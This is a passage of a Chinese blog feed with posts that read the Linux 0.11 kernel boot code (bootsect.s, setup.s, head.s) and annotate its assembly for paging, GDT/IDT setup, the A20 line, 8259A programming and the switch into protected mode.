class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/* Line 198 */</span><br><span class="line">.align 4/* 4 字节对齐 */</span><br><span class="line">setup_paging:</span><br><span class="line">movl $1024*5,%ecx/* 需将前 0x5000 的区域清零 */</span><br><span class="line">xorl %eax,%eax</span><br><span class="line">xorl %edi,%edi</span><br><span class="line">cld;rep;stosl/* cld 设置 edi 向高地址自增 */</span><br><span class="line">movl $pg0+7,pg_dir/* pg0 为第一个页表的地址 */</span><br><span class="line">movl $pg1+7,pg_dir+4/* +7 为设置页目录表项属性中的 U/S, R/W, P 位 */</span><br><span class="line">movl $pg2+7,pg_dir+8/* 全置 1 表示普通用户可读可写，且存在于内存中 */</span><br><span class="line">movl $pg3+7,pg_dir+12/* 到这里已经定义了四个页目录项 */</span><br><span class="line">/* 接下来是设置页表项，从后往前赋值 */</span><br><span class="line">movl $pg3+4092,%edi/* edi = 最后一张页表的最后一项地址 */</span><br><span class="line">movl $0xfff007,%eax/* 页表最后一项所对应的物理页是 0xfff000，+7 同上 */</span><br><span class="line">std/* 设置 edi 往低地址自减 */</span><br><span class="line">1:stosl/* eax 的值赋给 es:edi 指向的地址内容 */</span><br><span class="line">subl $0x1000,%eax/* 设置前一个页表项指向的物理页地址 */</span><br><span class="line">jge 1b/* 如果 eax 不小于 0，跳回 1 处继续赋值 */</span><br><span class="line">xorl %eax,%eax/* eax 清零 */</span><br><span class="line">movl %eax,%cr3/* 赋给 CR3，设置页目录表基址为 0，准备打开分页机制 */</span><br><span class="line">movl %cr0,%eax/* 获取 CR0 */</span><br><span class="line">orl $0x80000000,%eax/* PG 置 1 */</span><br><span class="line">movl %eax,%cr0/* 重新给 CR0 赋值，此时已经打开分页机制 */</span><br><span class="line">cld/* 将 DF 复位 */</span><br><span class="line">ret/* 返回到 init/main.c 的 main 函数，还记得之前的压栈吗？ */</span><br><span class="line"></span><br><span class="line">/* Line 115 */</span><br><span class="line">.org 0x1000/* .org 设置第一张页表的绝对地址为 0x1000，以下同理 */</span><br><span class="line">pg0:</span><br><span class="line"></span><br><span class="line">.org 0x2000</span><br><span class="line">pg1:</span><br><span class="line"></span><br><span class="line">.org 0x3000</span><br><span class="line">pg2:</span><br><span class="line"></span><br><span class="line">.org 0x4000</span><br><span class="line">pg3:</span><br></pre></td></tr></table></figure><p>到这里 head.s 的任务就完成了 ，不过还有一个小细节需要注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Line 127 */</span><br><span class="line">.org 0x5000</span><br><span class="line">tmp_floppy_area:</span><br><span class="line">.fill 1024,1,0</span><br></pre></td></tr></table></figure><p>在地址 0x5000 处还保留了 1K 的空间，当直接存储器不能访问缓冲块时，该区域就可以提供给软驱程序使用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读--引导启动部分（二）</title>
      <link href="/2020/03/21/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%BC%95%E5%AF%BC%E5%90%AF%E5%8A%A8%E9%83%A8%E5%88%86%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/03/21/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%BC%95%E5%AF%BC%E5%90%AF%E5%8A%A8%E9%83%A8%E5%88%86%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>之前也提到，setup.s 的作用是保存一些重要参数，将 system 模块从 0x10000 移到内存地址起始处，设置全局描述符表寄存器及中断描述符表寄存器，打开 A20 地址线，编辑 8259A 芯片，CR0 寄存器 PE 位置 1，跳转至 head.s</p><h2 id="保存参数"><a href="#保存参数" class="headerlink" title="保存参数"></a>保存参数</h2><p>其中保存的参数有：</p><table><thead><tr><th align="center">内存地址</th><th align="center">长度(bytes)</th><th align="center">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">0x90000</td><td align="center">2</td><td align="center">光标位置</td><td align="left">光标列号与行号</td></tr><tr><td align="center">0x90002</td><td align="center">2</td><td align="center">扩展内存数</td><td align="left">系统从 1MB 开始的扩展内存数值(KB)</td></tr><tr><td align="center">0x90004</td><td align="center">2</td><td align="center">显示页面</td><td align="left">当前显示页面</td></tr><tr><td align="center">0x90006</td><td align="center">1</td><td align="center">显示模式</td><td align="left">当前显示模式</td></tr><tr><td align="center">0x90007</td><td align="center">1</td><td align="center">字符列数</td><td align="left"></td></tr><tr><td align="center">0x90008</td><td align="center">2</td><td align="center">??</td><td align="left"></td></tr><tr><td align="center">0x9000A</td><td align="center">1</td><td align="center">显存大小</td><td align="left">(0-64k; 1-128k; 2-192k; 3-256k)</td></tr><tr><td align="center">0x9000B</td><td align="center">1</td><td align="center">显示状态</td><td align="left">0-彩色, I/O端口=0x3dX; 1-单色, I/O端口=0x3bX</td></tr><tr><td align="center">0x9000C</td><td align="center">2</td><td align="center">特性参数</td><td align="left">显卡特性</td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td><td align="left">…</td></tr><tr><td align="center">0x90080</td><td align="center">16</td><td align="center">硬盘参数表</td><td align="left">第一个硬盘的参数表</td></tr><tr><td align="center">0x90090</td><td align="center">16</td><td align="center">硬盘参数表</td><td align="left">第二个硬盘的参数表(如果没有，则清零)</td></tr><tr><td align="center">0x901FC</td><td align="center">2</td><td align="center">根设备号</td><td align="left">根文件系统所在的设备号(bootsect 已经设置好)</td></tr></tbody></table><br><p>下面是对实际代码的阅读：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* Line 17 */</span><br><span class="line">INITSEG  = 0x9000/* boosect 模块起始地址，现被用于存放内存/显卡等信息 */</span><br><span class="line">SYSSEG   = 0x1000/* system 模块所在的段地址 */</span><br><span class="line">SETUPSEG = 0x9020/* 当前 setup 模块段地址 */</span><br><span class="line"></span><br><span class="line">/* Line 21 */</span><br><span class="line">.globl begtext, begdata, begbss, endtext, enddata, endbss</span><br><span class="line">.text</span><br><span class="line">begtext:</span><br><span class="line">.data</span><br><span class="line">begdata:</span><br><span class="line">.bss</span><br><span class="line">begbss:</span><br><span class="line">.text</span><br><span class="line"></span><br><span class="line">/* Line 226 */</span><br><span class="line">.text</span><br><span class="line">endtext:</span><br><span class="line">.data</span><br><span class="line">enddata:</span><br><span class="line">.bss</span><br><span class="line">endbss:</span><br></pre></td></tr></table></figure><p>与 bootsect.s 相同，本程序实际上不分段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/* Line 30 */</span><br><span class="line">entry start</span><br><span class="line">start:</span><br><span class="line">movax,#INITSEG</span><br><span class="line">movds,ax/* 将数据段寄存器赋值 0x9000 */</span><br><span class="line">/* 保存光标位置 */</span><br><span class="line">movah,#0x03/* 功能号为 3，表示取光标位置 */</span><br><span class="line">xorbh,bh/* 第 0 页 */</span><br><span class="line">int0x10/* 返回值为 DL=列号，DH=行号 */</span><br><span class="line">mov[0],dx/* 存储在 0x90000 */</span><br><span class="line">/* 保存扩展内存的大小(KB) */</span><br><span class="line">movah,#0x88</span><br><span class="line">int0x15</span><br><span class="line">mov[2],ax/* 存储在 0x90002 */</span><br></pre></td></tr></table></figure><p>关于 BIOS 0x15 号中断：</p><p>功能号 AH = 0x88 表示取系统所含扩展内存的大小，返回值 AX = 从 0x100000 处开始的扩展内存大小，出错则将错误码保存在 AX 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Line 51 */</span><br><span class="line">movah,#0x0f</span><br><span class="line">int0x10</span><br><span class="line">mov[4],bx/* 当前显示页保存在 0x90004 */</span><br><span class="line">mov[6],ax/* 显示模式与字符列数保存在 0x90006 */</span><br><span class="line">/* 检查显示方式(EGA/VGA)，并取参数 */</span><br><span class="line">movah,#0x12</span><br><span class="line">movbl,#0x10/* 取 EGA 参数 */</span><br><span class="line">int0x10</span><br><span class="line">mov[8],ax</span><br><span class="line">mov[10],bx/* 显存大小及显示状态保存在 0x9000A */</span><br><span class="line">mov[12],cx/* 显卡特性参数保存在 0x9000C */</span><br></pre></td></tr></table></figure><p>关于 BIOS 0X10 号中断：</p><p>功能号 AH = 0x0f 表示取显卡当前显示模式，返回值：</p><ul><li>AH = 显示窗口的字符列数（window width）</li><li>AL = 显示模式</li><li>BH = 当前显示页</li></ul><p>功能号 AH = 0x12，BL = 0x10 表示取 EGA 配置信息，返回值：</p><ul><li>BH = 显示状态（0-彩色模式, I/O端口=0x3dX; 1-单色模式, I/O端口=0x3bX）</li><li>BL = 安装的显存大小（0-64k; 1-128k; 2-192k; 3-256k）</li><li>CX = 显卡特性参数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">/* Line 67 */</span><br><span class="line">/* 第一个硬盘的参数 */</span><br><span class="line">movax,#0x0000</span><br><span class="line">movds,ax/* ds 指向中断向量表 */</span><br><span class="line">/* LDS reg,mem 意味把 mem 所指的 32 位地址指针的段地址送入 DS,偏移地址送入 reg */</span><br><span class="line">/* 第一个硬盘参数表的地址指针放在 0x41 号中断向量处 */</span><br><span class="line">ldssi,[4*0x41]/* 现在 ds:si 指向 hd0 的参数表 */</span><br><span class="line">movax,#INITSEG</span><br><span class="line">moves,ax</span><br><span class="line">movdi,#0x0080</span><br><span class="line">movcx,#0x10</span><br><span class="line">rep</span><br><span class="line">movsb/* 将 hd0 的参数表拷贝至 0x90080，表长为 16 个字节 */</span><br><span class="line">/* 同理，以下部分在将 hd1 的参数表拷贝至 0x90090 */</span><br><span class="line">movax,#0x0000</span><br><span class="line">movds,ax</span><br><span class="line">ldssi,[4*0x46]/* 第二个硬盘参数表的地址指针为 0x46 号中断向量 */</span><br><span class="line">movax,#INITSEG</span><br><span class="line">moves,ax</span><br><span class="line">movdi,#0x0090</span><br><span class="line">movcx,#0x10</span><br><span class="line">rep</span><br><span class="line">movsb</span><br><span class="line">/* 现在来检查是否有 hd1，没有就将 0x90090 处 16 字节清空 */</span><br><span class="line">movax,#0x01500/* 功能号 0x15，表示取磁盘类型 */</span><br><span class="line">movdl,#0x81/* 要查询第二个硬盘 */</span><br><span class="line">int0x13</span><br><span class="line">jcno_disk1/* 没有这个盘就跳去 no_disk1 */</span><br><span class="line">cmpah,#3/* 如果该磁盘类型为硬盘 */</span><br><span class="line">jeis_disk1/* 就不作处理跳到 is_disk1，否则仍将刚才读入的第二硬盘参数表清空 */</span><br><span class="line">no_disk1:/* 将 0x90090 处 16 字节清空 */</span><br><span class="line">movax,#INITSEG</span><br><span class="line">moves,ax</span><br><span class="line">movdi,#0x0090</span><br><span class="line">movcx,#0x10</span><br><span class="line">movax,#0x00</span><br><span class="line">rep</span><br><span class="line">stosb</span><br><span class="line">is_disk1:</span><br><span class="line">cli/* 屏蔽所有外中断，准备进行 system 模块的移位 */</span><br></pre></td></tr></table></figure><p>至此，重要参数读完，</p><br><h2 id="移动-system-amp-设置-GDTR-IDTR"><a href="#移动-system-amp-设置-GDTR-IDTR" class="headerlink" title="移动 system &amp; 设置 GDTR/IDTR"></a>移动 system &amp; 设置 GDTR/IDTR</h2><p>接下来将 system 移到内存起始处，并设置 IDTR 与 GDTR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">/* Line 113 */</span><br><span class="line">movax,#0x0000</span><br><span class="line">cld/* 将 DF 位置 0，表示后面 movsw 时,si 与 di 向高地址递增 */</span><br><span class="line">do_move:/* 进入 move 循环 */</span><br><span class="line">moves,ax/* ax 为上次复制操作的目标段 */</span><br><span class="line">addax,#0x1000/* 加上 0x1000 */</span><br><span class="line">cmpax,#0x9000/* 判断是否等于 0x9000 */</span><br><span class="line">jzend_move/* 相等表示移动完毕，跳出循环 */</span><br><span class="line">movds,ax/* 否则将下个目标段放在 ds */</span><br><span class="line">subdi,di/* 清空 di,si */</span><br><span class="line">subsi,si</span><br><span class="line">mov cx,#0x8000/* 循环拷贝 0x8000 次 */</span><br><span class="line">rep</span><br><span class="line">movsw/* 每次拷贝 2 字节，所以一次拷贝 64KB */</span><br><span class="line">jmpdo_move</span><br><span class="line"></span><br><span class="line">! then we load the segment descriptors</span><br><span class="line"></span><br><span class="line">end_move:</span><br><span class="line">movax,#SETUPSEG</span><br><span class="line">movds,ax/* ds 指向 setup 模块 */</span><br><span class="line">lidtidt_48/* 将 6 字节的 0 载入 IDTR，指向一张空的中断表 */</span><br><span class="line">lgdtgdt_48/* 将 GDT 信息载入 GDTR */</span><br><span class="line"></span><br><span class="line">/* Line 205 */</span><br><span class="line">gdt:/* 定义了 3 个全局描述符 */</span><br><span class="line">.word0,0,0,0/* 第一个为空描述符 */</span><br><span class="line"></span><br><span class="line">.word0x07FF/* 段界限为 8M */</span><br><span class="line">.word0x0000/* 段基址为 0 */</span><br><span class="line">.word0x9A00/* P=1, DPL=00, S=1, 代码段，只读，可执行 */</span><br><span class="line">.word0x00C0/* G 位为 1，表示颗粒度为 4K */</span><br><span class="line"></span><br><span class="line">.word0x07FF/* 段界限为 8M */</span><br><span class="line">.word0x0000/* 段基址为 0 */</span><br><span class="line">.word0x9200/* P=1, DPL=00, S=1, 数据段，可读可写 */</span><br><span class="line">.word0x00C0/* G 位为 1，表示颗粒度为 4K */</span><br><span class="line">idt_48:</span><br><span class="line">.word0/* idt 界限为 0 */</span><br><span class="line">.word0,0/* idt 基址为 0 */</span><br><span class="line">gdt_48:</span><br><span class="line">.word0x800/* gdt 段限长暂时定为 2KB，能放 256 个描述符 */</span><br><span class="line">.word512+gdt,0x9/* gdt 基址为0x90200 + gdt */</span><br></pre></td></tr></table></figure><p>GDTR 与 IDTR 的结构再来回顾一下：</p><p><img src="../img/s1.png" alt="GDTR与IDTR"></p><p>描述符结构：</p><p><img src="../img/s2.png" alt="描述符"></p><p>详细的介绍在 <a href="https://in1nit1t.github.io/2020/03/15/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/" target="_blank">保护模式</a> 这篇文章中。</p><br><h2 id="打开-A20-地址线"><a href="#打开-A20-地址线" class="headerlink" title="打开 A20 地址线"></a>打开 A20 地址线</h2><p>此时 system 已经移到内存开始，下面打开 A20 地址线，需要打开 A20 地址线的原因是实模式下 A20 地址线默认关闭，只能访问 1M 的存储空间，打开后可以访问所有 4G 空间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* Line 138 */</span><br><span class="line">callempty_8042/* 反复测试 8042 状态寄存器，判断输入缓冲器是否为空 */</span><br><span class="line">moval,#0xD1/* 0xD1 命令码表示写数据到 8042 的 P2 端口 */</span><br><span class="line">out#0x64,al/* P2 端口位 1 用于 A20 地址线的选通 */</span><br><span class="line">callempty_8042/* 等待输入缓冲器为空，查看命令是否被接受 */</span><br><span class="line">moval,#0xDF/* 0xD1 命令码表示打开 A20 地址线 */</span><br><span class="line">out#0x60,al/* 数据写到 0x60 口 */</span><br><span class="line">callempty_8042/* 若此时输入缓冲器为空，表示 A20 已经打开 */</span><br><span class="line"></span><br><span class="line">/* Line 198 */</span><br><span class="line">empty_8042:</span><br><span class="line">.word0x00eb,0x00eb/* 效果类似 nop */</span><br><span class="line">inal,#0x64/* 读 AT 键盘控制器状态寄存器 */</span><br><span class="line">testal,#2/* 测试位 1，判断输入缓冲器是否为空 */</span><br><span class="line">jnzempty_8042/* 若非空，则跳回去循环判断 */</span><br><span class="line">ret/* 否则返回 */</span><br></pre></td></tr></table></figure><p>0xeb 是近地址跳转的操作码，可以携带一个字节的操作数，故跳转范围在 -127 ~ 127 之间，0x00eb 表示跳转到相对下一条指令偏移值为 0 的指令，相当于继续执行下一条指令，花费的 CPU 时钟周期数是 7~ 10 个，两条就可以造成 14 ~ 20 个时钟周期的延迟，一个 nop 指令只花费 3 个时钟周期数。因为 as86 中没有相应的指令助记符，所以 Linus 直接使用了机器码</p><br><h2 id="编辑-8259A-芯片"><a href="#编辑-8259A-芯片" class="headerlink" title="编辑 8259A 芯片"></a>编辑 8259A 芯片</h2><p>接下来该对 8259A 芯片重新编程，将硬件中断号设置成从 0x20 开始。PC 机使用两片 8259A，主片的操作端口是 0x20 - 0x21，从片的端口是 0xA0 - 0xA1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">/* Line 154 */</span><br><span class="line">moval,#0x11</span><br><span class="line">out#0x20,al/* 往主片端口发送 0x11 ICW1命令字，表示初始化命令开始 */</span><br><span class="line">.word0x00eb,0x00eb/* nop */</span><br><span class="line">out#0xA0,al/* 再将初始化信号发送给从片 */</span><br><span class="line">.word0x00eb,0x00eb</span><br><span class="line">moval,#0x20</span><br><span class="line">out#0x21,al/* 发送主片 ICW2 命令字，设置主片起始中断号为 0x20，要发给奇端口 */</span><br><span class="line">.word0x00eb,0x00eb</span><br><span class="line">moval,#0x28</span><br><span class="line">out#0xA1,al/* 发送从片 ICW2 命令字，设置从片起始中断号为 0x28 */</span><br><span class="line">.word0x00eb,0x00eb</span><br><span class="line">moval,#0x04</span><br><span class="line">out#0x21,al/* 发送主片 ICW3 命令字，表示主片 IR2 连接从片 INT */</span><br><span class="line">.word0x00eb,0x00eb</span><br><span class="line">moval,#0x02</span><br><span class="line">out#0xA1,al/* 发送从片 ICW3 命令字，表示从片 INT 连接主片 IR2 */</span><br><span class="line">.word0x00eb,0x00eb</span><br><span class="line">moval,#0x01</span><br><span class="line">out#0x21,al/* 发送主片 ICW4 命令字，8086 模式 */</span><br><span class="line">.word0x00eb,0x00eb</span><br><span class="line">out#0xA1,al/* 发送从片 ICW4 命令字，8086 模式，初始化结束，芯片就绪 */</span><br><span class="line">.word0x00eb,0x00eb</span><br><span class="line">moval,#0xFF</span><br><span class="line">out#0x21,al/* 屏蔽主片所有中断请求 */</span><br><span class="line">.word0x00eb,0x00eb</span><br><span class="line">out#0xA1,al/* 屏蔽从片所有中断请求 */</span><br></pre></td></tr></table></figure><br><h2 id="进入保护模式"><a href="#进入保护模式" class="headerlink" title="进入保护模式"></a>进入保护模式</h2><p>然后是 setup.s 最后部分，PE 置位，进入保护模式，结束连 Linus 都觉得无聊的与 BIOS、硬件等打交道的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Line 191 */</span><br><span class="line">movax,#0x0001</span><br><span class="line">lmswax/* 将 CR0 PE 位置 1 */</span><br><span class="line">jmpi0,8/* 跳转至 head.s 执行  */</span><br></pre></td></tr></table></figure><p>lmsw 指令意为置处理器状态字，只有操作数的低 4 位被存入 CR0，该指令仅兼容 286 的 CPU，386 以上的 CPU 应该使用 “mov cr0, ax” 切换到保护模式。同时在设置 PE 位后，随后的一条指令<strong>必须是段间跳转指令</strong>，以刷新 CPU 提前从内存取出并解码的实模式指令队列</p><p>执行最后一条跳转指令时，已处于保护模式，操作数 8 为段选择子，16 位二进制形式为 0b0000 0000 0000 1000，最低两位为 RPL，0 表示内核级，第三位为 TI 位，0 表示从 GDT 中选择描述符，其余高位为索引，这里是 1，表示选择第 2 项。另一个操作数 0，表示段内偏移量为 0。GDT 中第二项偏移 0，指向物理地址起始位置，该处为 head 模块。还记得段选择子结构吗？</p><p><img src="../img/s3.png" alt="选择子"></p><p>关于键盘控制器 8042 与 8259A 芯片的编程方法有必要时再专门记录在另一篇文章中</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读--引导启动部分（一）</title>
      <link href="/2020/03/20/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%BC%95%E5%AF%BC%E5%90%AF%E5%8A%A8%E9%83%A8%E5%88%86%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/20/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%BC%95%E5%AF%BC%E5%90%AF%E5%8A%A8%E9%83%A8%E5%88%86%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="boot-文件夹目录结构"><a href="#boot-文件夹目录结构" class="headerlink" title="boot 文件夹目录结构"></a>boot 文件夹目录结构</h2><p>该文件夹下有三个文件，分别是：</p><ul><li>bootsect.s：Intel 语法格式</li><li>setup.s：Intel 语法格式</li><li>head.s：AT&amp;T 语法格式</li></ul><p>从 linux 目录下的 Makefile 文件中，可以得知 bootsect.s 与 setup.s 是通过 as86 与 ld86 汇编链接的</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># linux/Makefile  Line 89</span></span><br><span class="line"><span class="section">boot/setup: boot/setup.s</span></span><br><span class="line"><span class="variable">$(AS86)</span> -o boot/setup.o boot/setup.s</span><br><span class="line"><span class="variable">$(LD86)</span> -s -o boot/setup boot/setup.o</span><br><span class="line"></span><br><span class="line"><span class="section">boot/bootsect:boot/bootsect.s</span></span><br><span class="line"><span class="variable">$(AS86)</span> -o boot/bootsect.o boot/bootsect.s</span><br><span class="line"><span class="variable">$(LD86)</span> -s -o boot/bootsect boot/bootsect.o</span><br></pre></td></tr></table></figure><p>而 head.s 是通过 as 与 ld 来汇编链接的，对于这三个文件使用两种套件的原因主要在于：</p><ul><li>bootsect.s 与 setup.s 是在实模式下运行的 16 位代码程序，head.s 则运行在 32 位保护模式下</li><li>1991 年的 GNU 的 as 汇编器仅支持 i386 及以后的 32位 CPU 代码指令，所以 16 位程序的代码需要另寻工具</li></ul><br><h2 id="boot-文件夹功能"><a href="#boot-文件夹功能" class="headerlink" title="boot 文件夹功能"></a>boot 文件夹功能</h2><p>各文件大致的功能在文件开头的作者注释中都简要给出了，这里还是先介绍一下 Linux 镜像 Image 的构成：</p><p><img src="../img/b1.png" alt="Image构成"></p><p>在 Makefile 文件第 40 行有所体现，Image 按 bootsect，setup，system 模块的顺序由 tools目录下的 build 工具拼接而成，其中 system 模块又按 head，main，kernel，mm，fs，lib 的顺序组成</p><p>PC 机加电启动时执行的顺序如下（main.c 在 init 目录下）：</p><p><img src="../img/b2.png" alt="执行顺序"></p><p>加电后，处理器自动进入实模式，从 ROM-BIOS 的地址 0xFFFF0 处自动执行系统自检代码（该过程称为 POST，Power On Self Test），并在物理地址 0 处初始化 BIOS 的中断向量。</p><p>之后，将可启动设备的第一个扇区（磁盘引导扇区）读入内存地址 0x7C00 处，并跳转到该处执行，对于 Linux 而言，引导扇区装入的是 bootsect 模块的代码，标志着内核初始化工作开始</p><p>bootsect 先将自己拷贝到物理地址 0x90000 处，跳过去接着执行，将可启动设备之后的 4 个扇区（2KB）读入物理地址 0x90200 处，这 2KB 正是 setup 模块的内容。再将 system 模块的内容读入物理地址 0x10000 处，因为当时 system 模块长度不超过 0x80000 bytes，因此不会覆盖到 0x90000 处的 bootsect 与 0x90200 处的 setup。至此，bootsect 模块的使命完成，跳转至 0x90200，将控制权交给 setup 模块</p><p>setup 首先“过河拆桥”地将一些硬件信息保存在地址 0x90000（覆盖 bootsect 模块），然后将在 0x10000 处的 system 模块搬运到物理地址 0 处（内存开头），配置 IDTR 与 GDTR，打开 A20 地址线，设置好 8259A 芯片，将 CR0 的 PE 位置位，进入保护模式。setup 的使命也完成了，跳到地址 0 处，将控制权交给 system 模块中的 head.s  程序</p><p>以上流程均在下图中体现（横坐标为阶段 1 ~ 6）：</p><p><img src="../img/b3.png" alt="功能"></p><br><h2 id="bootsect-s"><a href="#bootsect-s" class="headerlink" title="bootsect.s"></a>bootsect.s</h2><p>代码中的 ! 与 /**/ 均为注释标记，篇幅有限不进行翻译，把握住程序的主干逻辑即可，下面正式开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Line 6 */</span><br><span class="line">SYSSIZE = 0x3000</span><br></pre></td></tr></table></figure><p>声明了一个常量 SYSSIZE，单位是节(16 bytes)，也就是说当前 system 模块的长度为 196 KB，因为 0x10000 与 0x90000 之间相隔 0x80000，所以这个值最大为 0x8000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/* Line 25 */</span><br><span class="line">.globl begtext, begdata, begbss, endtext, enddata, endbss</span><br><span class="line">.text</span><br><span class="line">begtext:</span><br><span class="line">.data</span><br><span class="line">begdata:</span><br><span class="line">.bss</span><br><span class="line">begbss:</span><br><span 